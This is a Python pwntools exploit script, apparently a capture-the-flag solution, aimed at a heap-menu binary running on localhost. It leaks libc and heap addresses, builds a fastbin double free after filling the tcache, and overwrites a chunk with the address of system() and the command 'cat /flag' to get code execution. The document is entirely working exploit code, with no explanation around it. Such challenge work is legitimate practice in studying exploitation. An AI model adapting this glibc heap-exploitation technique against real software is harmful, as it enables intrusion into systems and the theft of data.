from pwn import *

context.terminal=['wt.exe', '-w', '0', 'nt', 'wsl.exe']
exe = context.binary = ELF("chall_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.39.so")

#p = exe.process()
#p = exe.debug()
p = remote("localhost", 50000)

def malloc(index, size):
    p.sendline(b'1')
    p.sendline(f"{index}".encode('utf-8'))
    p.sendline(f"{size}".encode('utf-8'))

def edit(index, what):
    p.sendline(b'2')
    p.sendline(f"{index}".encode('utf-8'))
    p.send(what)

def free(index):
    p.sendline(b'3')
    p.sendline(f"{index}".encode('utf-8'))

def inspect(index):
    p.sendline(b'4')
    p.clean()
    p.sendline(f"{index}".encode('utf-8'))
    p.recvuntil(b'Content: ')
    return p.recvuntil(b'\n')[:-1]

malloc(0, 0x410) # libc leak
malloc(1, 0x20)  # guard
malloc(2, 0x20)  # heap leak
malloc(3, 0x20)  # guard

free(0)
malloc(0, 0x410)
leak_1 = unpack(inspect(0), 'all')
libc.address = leak_1 - 0x203b20

free(2)
malloc(2, 0x20)
leak_2 = unpack(inspect(2), 'all') << 12

print(f"{hex(leak_1)=}")
print(f"{hex(leak_2)=}")

free(0)
free(1)
free(2)
free(3)

# fill 0x30 tcache
malloc(0, 0x20)
malloc(1, 0x20)
malloc(2, 0x20)
malloc(3, 0x30)

malloc(4, 0x30)
malloc(5, 0x30)


free(0)
free(1)
free(2)
free(3)

# double free in fast bin
free(4)
free(5)
free(4)

malloc(0, 0x20)
malloc(1, 0x20)
malloc(2, 0x20)
malloc(3, 0x30)

malloc(4, 0x30)
malloc(5, 0x20)

edit(4, p64(libc.symbols["system"]) + b'cat /flag\x00' + b'B'*0x1E)
edit(5, b'\x20')

p.clean()

p.sendline(b'4')
p.sendline(b'4')

p.interactive()